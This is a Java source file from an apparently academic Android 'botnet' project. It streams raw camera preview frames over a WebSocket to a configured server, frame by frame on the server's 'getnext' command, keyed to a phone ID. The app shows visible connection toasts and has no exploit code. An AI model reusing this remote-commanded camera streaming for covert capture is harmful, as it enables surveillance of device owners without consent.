package de.tudarmstadt.botnet.janus_yanai;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.hardware.Camera;
import android.hardware.Camera.PreviewCallback;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.MessageQueue;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;
import de.tavendo.autobahn.WebSocketConnection;
import de.tavendo.autobahn.WebSocketException;
import de.tavendo.autobahn.WebSocketHandler;
import de.tavendo.autobahn.WebSocketOptions;

class WSEvtHandler extends WebSocketHandler {
	private final Context context;
	Handler guihandler;
	SenderPreviewCallback spc;

	WSEvtHandler(Context context, SenderPreviewCallback spc, Handler guihandler) {
		this.spc = spc;
		this.context = context;
		this.guihandler = guihandler;
	}

	@Override
	public void onClose(int code, final String reason) {
		super.onClose(code, reason);
		guihandler.post(new Runnable() { public void run() { 
		Toast.makeText(context, "Closed because: " + reason, Toast.LENGTH_LONG).show();
		Log.d(SenderPreviewCallback.TAG,"Closed: " + reason);
		}});
	}

    @Override
    public void onTextMessage(final String payload) {
    	super.onTextMessage(payload);
    	
    	String command;
    	
    	try {
			JSONObject jsonObject = new JSONObject(payload);
			//JSONObject jsonObject = jsonArray.getJSONObject(0);
			command = jsonObject.getString("command");
		} catch (JSONException e) {
			e.printStackTrace();
			throw new RuntimeException("Didn't understand JSON data");
		}
    	
    	if (command.equals("getnext")) {
    		spc.readyToSend = true;
    	} else {
    		guihandler.post(new Runnable() { public void run() { Toast.makeText(context, "WebSocket: " + payload, Toast.LENGTH_LONG).show(); }});
    	}
	}

	@Override
	public void onOpen() {
		super.onOpen();
		guihandler.post(new Runnable() { public void run() { 
		Toast.makeText(context, "Opened", Toast.LENGTH_LONG).show();
		}});
	}
}
public class SenderPreviewCallback implements PreviewCallback  {
	
	@Override
	protected void finalize() {
		Log.d(TAG, "STOP");
	}
	
	static final String TAG="SPC";
	WebSocketConnection sess = new WebSocketConnection();
	WebSocketOptions options = new WebSocketOptions();
	final Handler guihandler = new Handler();
	
	Camera camera;
	LooperThread lt;
	
	boolean readyToSend = false;
	
	public SenderPreviewCallback(final Camera camera, final Context context, final CameraDemo cd) {
		Log.d(TAG,"START");
		this.camera = camera;
		
        options.setMaxMessagePayloadSize(1*1024*1024);
        options.setMaxFramePayloadSize(1*1024*1024);
		
		Log.d(TAG,"Connecting");
		
		try {
			sess.connect("ws://"+BotClientActivity.getIP(context) +"/ws/img?phone=" + Config.getID(context), new WSEvtHandler(context, this, guihandler), options);
		} catch (WebSocketException e) {
			camera.stopPreview();
			e.printStackTrace();
			Toast.makeText(context, e.toString(), Toast.LENGTH_LONG).show();
		}
		
		lt = new LooperThread(sess);
		lt.start();
		
    	Log.d(TAG,"Connected");

    	readyToSend = true;
	}
	
	void killThem() {
		try { camera.stopPreview(); } catch (Exception e) { e.printStackTrace(); }

		lt.mHandler.getLooper().quit();
		
		if (sess != null && sess.isConnected()) sess.disconnect();
		
		sess = null;
	}
	
	@Override
	public void onPreviewFrame(byte[] data, Camera camera) {
		//if (frameno++ < framenolimit) { return; }
		//frameno = 0;
		if (!readyToSend) {
			//Log.d(TAG, "Not ready to send");
			return;
		}
		
		Log.d(TAG, "Ready to send");
		
		readyToSend = false;
		
		Message msg = new Message();
		Bundle bndl = new Bundle();

		bndl.putByteArray(null, data);
		msg.setData(bndl);
		
		lt.mHandler.sendMessage(msg);
	}

}

class LooperThread extends Thread {
    public Handler mHandler;
    WebSocketConnection sess;
    
    MessageQueue getQueue() {
    	return Looper.myQueue();
    }
    
    LooperThread(WebSocketConnection sess) {
    	this.sess = sess;
    }
    
    public void run() {
        Looper.prepare();

        mHandler = new Handler() {
        	@Override
            public void handleMessage(Message msg) {
            	sess.sendBinaryMessage(msg.getData().getByteArray(null));
            }
        };

        try {
        	Looper.loop();
        } catch (NullPointerException e)  {// i autobahn
        	e.printStackTrace();
        	return;
        }
    }
}
